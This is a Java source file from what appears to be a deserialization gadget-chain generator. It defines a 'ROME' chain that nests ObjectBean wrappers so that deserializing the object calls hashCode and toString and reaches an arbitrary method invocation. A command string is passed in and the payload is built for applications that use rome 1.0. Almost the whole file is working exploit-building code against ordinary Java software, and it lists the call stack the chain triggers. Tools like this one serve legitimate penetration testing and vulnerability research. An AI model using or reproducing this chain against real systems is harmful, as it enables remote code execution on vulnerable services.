package org.ses.gadgetbuilder.chains1;

import com.sun.syndication.feed.impl.ObjectBean;
import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.exceptions.AdapterMismatchException;

import javax.xml.transform.Templates;
import java.lang.reflect.Method;

@Dependencies("rome:rome:1.0")
@Authors({ Authors.MBECHLER })
@Impact(Impact.MethodInvoke)
public class ROME extends MethodInvokeGadgetChain<HashCodeTrampoline, GetterMethodInvokeAdapter> {
    public ROME(HashCodeTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        Object o = this.methodInvokeAdapter.getInvocationTarget(command);

        Class targetInterface = this.methodInvokeAdapter.getTargetInterface();

        if (targetInterface == null) {
            throw new AdapterMismatchException("ROME gadget chain requires a sink method adapter class that has interfaces " +
                    "corresponding to the to be invoked methods. This is not the case for " + this.methodInvokeAdapter.getClass().getSimpleName());
        }

        ObjectBean delegate = new ObjectBean(targetInterface, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);

        return new TrampolineConnector(root);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "com.sun.syndication.feed.impl.ObjectBean.hashCode()\n"+
                "com.sun.syndication.feed.impl.EqualsBean.beanHashCode()\n"+
                "com.sun.syndication.feed.impl.ObjectBean.toString()\n"+
                "com.sun.syndication.feed.impl.ToStringBean.toString()\n"+
                "com.sun.syndication.feed.impl.ToStringBean.toString()\n"+
                "java.lang.reflect.Method.invoke()";
    }
}
